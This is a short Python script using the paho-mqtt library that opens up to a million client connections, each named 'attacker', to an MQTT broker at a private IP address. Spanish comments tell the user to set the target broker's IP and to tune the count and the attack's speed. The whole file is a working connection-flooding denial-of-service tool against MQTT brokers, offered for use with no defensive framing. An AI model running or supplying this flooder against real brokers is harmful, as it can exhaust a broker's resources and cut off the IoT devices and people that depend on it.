import paho.mqtt.client as mqtt
import time

BROKER = "10.0.2.15"  # Reemplaza con la IP de tu broker
PORT = 1883

clients = []

try:
    for i in range(1000000):  # Ajusta la cantidad segun capacidad del sistema
        client = mqtt.Client(client_id=f"attacker_{i}")
        client.connect(BROKER, PORT)
        clients.append(client)
        print(f"[+] Connected client {i}")
        time.sleep(0.01)  # Controla la velocidad del ataque
except Exception as e:
    print(f"[!] Error: {e}")
